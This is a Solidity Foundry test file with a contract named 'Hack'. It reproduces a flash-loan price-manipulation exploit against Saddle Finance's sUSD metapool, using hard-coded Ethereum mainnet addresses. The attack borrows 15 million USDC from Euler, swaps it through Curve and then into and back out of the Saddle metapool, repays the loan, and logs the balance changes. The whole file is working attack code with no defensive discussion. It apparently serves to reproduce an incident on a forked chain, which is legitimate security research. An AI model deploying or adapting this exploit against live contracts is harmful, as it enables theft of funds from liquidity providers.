pragma solidity 0.8.12;

import "ds-test/test.sol";
import "forge-std/stdlib.sol";
import "forge-std/Vm.sol";

contract SaddleAddr is DSTest , stdCheats{
    uint256 ONE_USDT = 10**6;
    uint256 ONE_USDC = 10**6;
    uint256 ONE_DAI = 10**18;
    uint256 ONE_SUSD = 10**18;

    address public stableswap = 0xaCb83E0633d6605c5001e2Ab59EF3C745547C8C7;
    
    address public metaswap = 0x824dcD7b044D60df2e89B1bB888e66D8BCf41491;
    
    address public USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    
    address public sUSD = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;

    address public CurvePool = 0xA5407eAE9Ba41422680e2e00537571bcC53efBfD; //sUSD + DAI + USDC + USDT
    address public stableswapLp = 0x5f86558387293b6009d7896A61fcc86C17808D62;

    address public EulerVault = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
    address public EulerExeProxy = 0x59828FdF7ee634AaaD3f58B19fDBa3b03E2D9d80;
    address public EulerMarketProxy = 0x3520d5a913427E6F0D6A83E07ccD4A4da316e4d3;


}
interface ERC20Like {
    function approve(address, uint256) external;
    function transfer(address, uint256) external;
    function balanceOf(address) external returns (uint256);
}
interface EulerExeLike {
     function deferLiquidityCheck(address account, bytes memory data) external;
}
interface EulerDTokenLike {
    function borrow(uint subAccountId, uint amount) external;
    function repay(uint subAccountId, uint amount) external;
}
interface EulerMarketLike {
    function underlyingToDToken(address underlying) external view returns (address);
}
interface CurveLike {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
    function coins() external view returns (address[] calldata);
}
interface MetaSwapLike {
    function swap(
        uint8 tokenIndexFrom,
        uint8 tokenIndexTo,
        uint256 dx,
        uint256 minDy,
        uint256 deadline
    ) external returns (uint256);
    function swapUnderlying(
        uint8 tokenIndexFrom,
        uint8 tokenIndexTo,
        uint256 dx,
        uint256 minDy,
        uint256 deadline
    ) external returns (uint256);
}

contract Hack is SaddleAddr {
    address public EulerUSDCDebtToken;
    uint256 public constant USDC_BORROW_AMOUNT = 15_000_000_000_000;
    int128 public constant USDC_INDEX = 1;
    int128 public constant SUSD_INDEX = 3;
    constructor() {
        EulerUSDCDebtToken = EulerMarketLike(EulerMarketProxy).underlyingToDToken(USDC);
        emit log_named_address("EulerUSDCDebtToken",EulerUSDCDebtToken);

        ERC20Like(stableswapLp).approve(metaswap, type(uint256).max);
        ERC20Like(sUSD).approve(metaswap, type(uint256).max);
        ERC20Like(sUSD).approve(CurvePool, type(uint256).max);
        ERC20Like(USDC).approve(CurvePool, type(uint256).max);
        ERC20Like(USDC).approve(EulerVault, type(uint256).max);//real works dones here
        
    }
    function start() public {
        EulerExeLike(EulerExeProxy).deferLiquidityCheck(address(this), "");
    }
    function onDeferredLiquidityCheck(bytes memory encodedData) external {
        require(msg.sender == EulerVault, "not proxy");

        EulerDTokenLike(EulerUSDCDebtToken).borrow(0, USDC_BORROW_AMOUNT);
        controller();
        EulerDTokenLike(EulerUSDCDebtToken).repay(0, USDC_BORROW_AMOUNT);
        res("finish");
    }
    /// exchange USDC for sUSD in CurvePool
    /// swpa sUSD for lp in saddle metapool
    /// swapUnderlying lp for sUSD in saddle metapool
    function controller() public {
        CurveLike(CurvePool).exchange(USDC_INDEX, SUSD_INDEX, USDC_BORROW_AMOUNT, 0);

        res("exchange");
        
        uint256 sUSDAmount = ERC20Like(sUSD).balanceOf(address(this));

        uint256 lpAmount = MetaSwapLike(metaswap).swap(0, 1, sUSDAmount, 0, block.timestamp);

        res("swap");

        sUSDAmount = MetaSwapLike(metaswap).swap(1, 0, lpAmount, 0, block.timestamp);

        res("swapBack");

        CurveLike(CurvePool).exchange(SUSD_INDEX, USDC_INDEX, sUSDAmount, 0);

        res("swap back through curve");
    }

    function res(string memory s) public {
        emit log_named_string("======HACK======", s);
        emit log_named_uint("USDC balance", ERC20Like(USDC).balanceOf(address(this)));
        emit log_named_uint("sUSD balance", ERC20Like(sUSD).balanceOf(address(this)));
        emit log_named_uint("lp balance", ERC20Like(stableswapLp).balanceOf(address(this)));
    }
}

contract FULL is SaddleAddr {
    Vm public vm = Vm(HEVM_ADDRESS);
    Hack public hack;

    function setUp() public {
        hack = new Hack();
    }
    function test_Start() public {
        hack.start();
    }
}